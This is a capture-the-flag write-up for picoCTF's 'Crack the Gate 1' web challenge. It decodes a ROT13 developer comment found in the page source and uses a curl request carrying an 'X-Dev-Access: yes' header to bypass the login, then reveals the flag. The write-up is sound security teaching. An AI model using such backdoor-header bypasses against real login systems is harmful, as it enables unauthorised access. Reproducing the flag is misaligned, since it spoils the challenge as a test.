# Crack the Gate 1
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)

## Challenge information
```
Tags: Web Exploitation, picoMini by CMU-Africa, browser_webshell_solvable
  
Description:  
We’re in the middle of an investigation.  
One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal.  
We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org.  
Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked.  
But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
  
Hints:  
1. Developers sometimes leave notes in the code; but not always in plain text.
2. A common trick is to rotate each letter by 13 positions in the alphabet.  
```
## Overview
When entering the website, a login page appears  
<img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/48daae86-9317-4867-b187-33f8962fc500" />  
  
The website has provided us with an email and our job is to log in with this email  
Email: ctf-player@picoctf.org  
  
`Ctr+U` to view the page source, we see that the developer left a comment that should probably be deleted  
<img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/52d04548-5330-476e-811c-ca97fef00ecb" />  

## Solution
**B1:** Decode  
`ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf` => This is a piece of code encoded with rot13  
After coding, this is the collected data: `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`   
**B2:** Exploit  
You can use burpsuite to capture requests and send them or you can use Curl to send requests.  
In this case, I use Curl  
`curl -X POST http://amiable-citadel.picoctf.net:YourPost/login -H "Content-Type: application/json" -H "X-Dev-Access: yes" -d '{"email":"ctf-player@picoctf.org","password":"123"}'`  

## Flag 
`picoCTF{brut4_f0rc4_cbb8faa7}`



